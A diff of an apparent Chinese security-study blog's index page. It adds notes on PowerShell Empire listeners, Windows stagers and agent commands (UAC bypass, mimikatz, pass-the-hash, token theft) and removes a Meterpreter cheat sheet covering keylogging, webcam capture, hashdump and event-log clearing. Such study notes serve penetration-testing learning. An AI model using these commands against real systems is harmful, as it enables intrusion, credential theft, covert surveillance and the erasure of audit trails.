@@ -64,6 +64,76 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-empire基操" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/" class="article-date">
+  <time datetime="2021-08-18T04:33:41.000Z" itemprop="datePublished">2021-08-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/">empire基操</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="基操"><a href="#基操" class="headerlink" title="基操"></a>基操</h2><p><code>可以用tab补全查看指令</code></p>
+<p>uselistener  使用监听器</p>
+<p>usemodule 使用模块</p>
+<p>usestager  使用stager</p>
+<p>main            回到主界面</p>
+<p>back            返回上一级</p>
+<h4 id="生成监听器"><a href="#生成监听器" class="headerlink" title="生成监听器:"></a>生成监听器:</h4><p><img src="C:\Users\chhzy\AppData\Roaming\Typora\typora-user-images\image-20210718213722672.png" alt="image-20210718213722672"></p>
+<p>​        (Empire: listeners) &gt; uselistener http<br>​        (Empire: listeners/http) &gt; info<br>​        (Empire: listeners/http) &gt;set Name xxx<br>​        (Empire: listeners/http) &gt;set Port xxx<br>​        (Empire: listeners/http) &gt; execute</p>
+<p>​    [*] Starting listener ‘parrot’</p>
+<ul>
+<li>Serving Flask app “http” (lazy loading)</li>
+<li>Environment: production<br>WARNING: This is a development server. Do not use it in a production deployment.<br>Use a production WSGI server instead.</li>
+<li>Debug mode: off<br>[+] Listener successfully started!</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name --&gt; 监听器的名字</span><br><span class="line">Host --&gt; 监听器的ip</span><br><span class="line">Port --&gt; 监听的端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="生成stager"><a href="#生成stager" class="headerlink" title="生成stager:"></a>生成stager:</h4><p>![image-20210718213526986](D:\yuchen Study\part three\usestager.png)</p>
+<p>​    multi –&gt; linux</p>
+<p>​    osx –&gt; mac</p>
+<p>​    windows</p>
+<p>windows常用:<br>        windows/launcher_bat<br>        windows/launcher_vbs<br>        windows/launcher_lnk<br>        windows/dll<br>        windows/hta<br>        windows/launcher_xml<br>        windows/macro<br>        windows/wmic</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire: listeners) &gt; usestager windows&#x2F;launcher_bat</span><br><span class="line">(Empire: stager&#x2F;windows&#x2F;launcher_bat) &gt; info</span><br><span class="line">(Empire: stager&#x2F;windows&#x2F;launcher_bat) &gt; set Listener parrot</span><br><span class="line">(Empire: stager&#x2F;windows&#x2F;launcher_bat) &gt; set OutFile .&#x2F;1.bat</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取到shell"><a href="#获取到shell" class="headerlink" title="获取到shell"></a>获取到shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interact --&gt; 进入到交互模式</span><br><span class="line">kill     --&gt; 杀死会话</span><br><span class="line">killdate --&gt; 指定日期杀死会话 killdate [agent&#x2F;all] 01&#x2F;01&#x2F;2016</span><br><span class="line">rename     --&gt; 给agents重命名</span><br><span class="line">searchmodule --&gt; 搜索模块</span><br><span class="line"></span><br><span class="line">Active agents: </span><br><span class="line">如果agents是绿色的, 代表是存活的;如果是红色, 那就是掉线的状态.</span><br><span class="line"></span><br><span class="line">interact中:</span><br><span class="line">bypassuac --&gt; bypassuac提权</span><br><span class="line">jobs      --&gt; 查看工作中的任务</span><br><span class="line">upload      --&gt; 文件上传</span><br><span class="line">download  --&gt; 文件下载</span><br><span class="line">dirlist   --&gt; 列出目录列表</span><br><span class="line">injectshellcode --&gt; 利用shellcode进程迁移到meterpreter</span><br><span class="line">mimikatz  --&gt; 加载账号密码(hashdump)</span><br><span class="line">psinject  --&gt; 利用shellcode进程迁移</span><br><span class="line">pth       --&gt; pass the hash</span><br><span class="line">shell + 指令 --&gt; 用cmd执行指令</span><br><span class="line">sysinfo   --&gt; 获取系统基本信息</span><br><span class="line">spawn     --&gt; 生成新的agent</span><br><span class="line">steal_token --&gt; 令牌盗用</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>在empire中, 拥有管理员权限, username前面会多一个* ,也就是提权成功了</code></p>
+<p>指令: bypassuac –&gt; bypassuac_eventvwr</p>
+<p><code>searchmodule bypassuac</code> –&gt; <code>ask --&gt; uac提权</code></p>
+<p>在interact中, 可以用run去执行指令</p>
+<p>查找本地提权漏洞:  </p>
+<p>​    powershell/privesc/sherlock</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Title      : User Mode to Ring (KiTrap0D)</span><br><span class="line">MSBulletin : MS10-015</span><br><span class="line">CVEID      : 2010-0232</span><br><span class="line">Link       : https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;11199&#x2F;</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">title: 漏洞名称</span><br><span class="line">MSBulletin: ms漏洞编号</span><br><span class="line">CVEID: cve漏洞编号</span><br><span class="line">Link: exp</span><br><span class="line">VulnStatus: 漏洞状态</span><br></pre></td></tr></table></figure>
+
+<p>privesc/getsystem*  –&gt; 相当于msf中的getsystem</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="cksh04fmr00081wvj74fc7irx" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-免杀收尾和empire" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" class="article-date">
@@ -111,7 +181,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckse84po9000i8wvj2nl1fjcs" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="cksh04fn1000j1wvj3uwm232x" class="article-share-link">Share</a>
       
       
     </footer>
@@ -177,7 +247,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="ckse84po2000f8wvjfzx99q1u" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="cksh04fn0000h1wvj0spu53w8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -259,7 +329,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="ckse84po6000h8wvjayhm3j89" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="cksh04fmy000g1wvjauvk6inn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -333,7 +403,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckse84pni00068wvjfv8p6ycx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cksh04fmq00071wvj3pg61wk3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -404,7 +474,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckse84pnp00098wvj1aoqbga6" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="cksh04fmt000a1wvj5rfy0ag2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -472,7 +542,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckse84pnu000b8wvjhd3v7to2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="cksh04fmv000c1wvj1cv8bx1b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -543,7 +613,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckse84pnz000d8wvjem6f5by2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cksh04fmu000b1wvj8c5xbvrk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -629,7 +699,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckse84pnx000c8wvj9bxi2mez" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="cksh04fmx000e1wvj9xsl32nl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -688,125 +758,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckse84pnr000a8wvjc3kk40q9" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-MSF-meterpreter" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/07/20/MSF-meterpreter/" class="article-date">
-  <time datetime="2021-07-20T12:12:07.000Z" itemprop="datePublished">2021-07-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/20/MSF-meterpreter/">MSF--meterpreter</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>  碰到powershell无法执行脚本的情况:</p>
-<p>  执行脚本权限（策略）</p>
-<ul>
-<li><p>Restricted    受限制</p>
-</li>
-<li><p>allsigned      已分配</p>
-</li>
-<li><p>Unrestricted 不受限制</p>
-</li>
-<li><p>remotesigned 远程分配</p>
-</li>
-<li><p>查看执行策略</p>
-<ul>
-<li>Get-ExecutionPolicy</li>
-</ul>
-</li>
-<li><p>修改执行策略(需要管理员)</p>
-<ul>
-<li>Set-ExecutionPolicy unrestricted</li>
-</ul>
-<p>绕过执行策略:powershell -exec bypass -c comannd</p>
-<p>创建文件:copy con filename</p>
-<p>con:进入到编辑模式</p>
-<p>修改属性:attrib</p>
-<p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。attrib +s +a +h +r D:\test\project\test .txt。这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p>
-<p>创建文件:fsutil file createnew  filename size</p>
-</li>
-</ul>
-</blockquote>
-<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><h5 id="两种session"><a href="#两种session" class="headerlink" title="两种session:"></a>两种session:</h5><p>​    Command shell session    –&gt; 就是cmd</p>
-<p>​    meterpreter session            –&gt; 返回meterpreter</p>
-<p>​                        </p>
-<h5 id="指令"><a href="#指令" class="headerlink" title="指令:"></a>指令:</h5><p>​    jobs                                      查看工作</p>
-<p>​    jobs -k id                           杀死只当的工作,-k kill</p>
-<p>​    jobs -K                                 杀死所有的工作</p>
-<p>​    session                                 查看连接到的会话</p>
-<p>​    session -k id                        杀死指定的session</p>
-<p>​    session -K                            杀死所有的session</p>
-<p>​    run -j                                         放到后台监听</p>
-<p>​    run -z                                        连接到了不会立马进入到交互模式</p>
-<h5 id="meterpreter-1"><a href="#meterpreter-1" class="headerlink" title="meterpreter:"></a>meterpreter:</h5><p>​    getuid                                         查看当前用户</p>
-<p>​    sysinfo                                        查看当前系统的基本信息</p>
-<p>​    getpid                                         获取当前木马的pid</p>
-<p>​    getsid                                         获取sid  </p>
-<p>​    getsystem                                 获取管理员权限(初步提权,成功说明提权成功)</p>
-<p>​    bg | background                    返回控制台</p>
-<p>​    exit                                                退出当前session(关闭)</p>
-<p>会话迁移: payload注入到新的进程当中,确保连接的稳定性</p>
-<p>migrate    pid                                会话迁移</p>
-<p>hashdump                                    下载sam文件中的账号密码信息</p>
-<p>play                                                    播放.wav的文件</p>
-<p>Webcam Commands:</p>
-<p>webcam_stream                            查看摄像头(相当于监控)</p>
-<p>webcam_list                                    列出有多少个摄像头</p>
-<p>webcam_snap                                对摄像头做截屏</p>
-<p>User interface Commands:</p>
-<p>keyscan_dump                                下载键盘记录</p>
-<p>keyscan_start                                    开启键盘监听</p>
-<p>keyscan_stop                                    停止键盘监听</p>
-<p>screenshare                                        看对方的电脑桌面(实时的,有延迟),以html文件的方式</p>
-<p>run vnc                                                    看对方的电脑桌面(实时的,有延迟),以弹框的方式</p>
-<p>screenshot                                            屏幕截图</p>
-<p>uictl [enable/disable] [keyboard/mouse/all]    对键盘鼠标进行控制(禁用或者开启)</p>
-<p><strong>clearev</strong>                    清除痕迹(系统日志,安全日志,应用日志)(前提有特权,才能清除的干净)</p>
-<p>steal_token                                            身份盗用</p>
-<p>rev2self                                                        返还身份</p>
-<p> shutdown                                                关机</p>
-<p><strong>shell</strong>                                                            进入到cmd或者进入到bash</p>
-<p>kill    pid                                                    杀死进程</p>
-<p>execute <code>-i -H  -f cmd</code>                            执行指令                </p>
-<p>upload    local_file     remote_path                上传文件            </p>
-<p>download remote_file local_path\save_filename                 下载文件</p>
-<p>show_mount                                             磁盘信息</p>
-<p>Core Commands:</p>
-<p>background | bg                                    返回控制台</p>
-<p>get_timeouts                                            获取session超时时间</p>
-<p>linux:.elf,.sh</p>
-<p>linux执行文件:</p>
-<p>./ —&gt; 有可执行的权限,chmod u+x file —&gt; ./file</p>
-<p>bash file</p>
-<p>windows:bat,exe,hta</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckse84pn100018wvjcojuarb2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="cksh04fmw000d1wvjawvzarpv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -820,7 +772,7 @@ shellcode: 机器码(二进制,十六进制)
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -852,6 +804,10 @@ shellcode: 机器码(二进制,十六进制)
       <ul>
         
           <li>
+            <a href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/">empire基操</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/">免杀收尾和empire</a>
           </li>
         
@@ -865,10 +821,6 @@ shellcode: 机器码(二进制,十六进制)
         
           <li>
             <a href="/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">armitage和漏洞复现</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/">linux后门植入</a>
           </li>
         
       </ul>
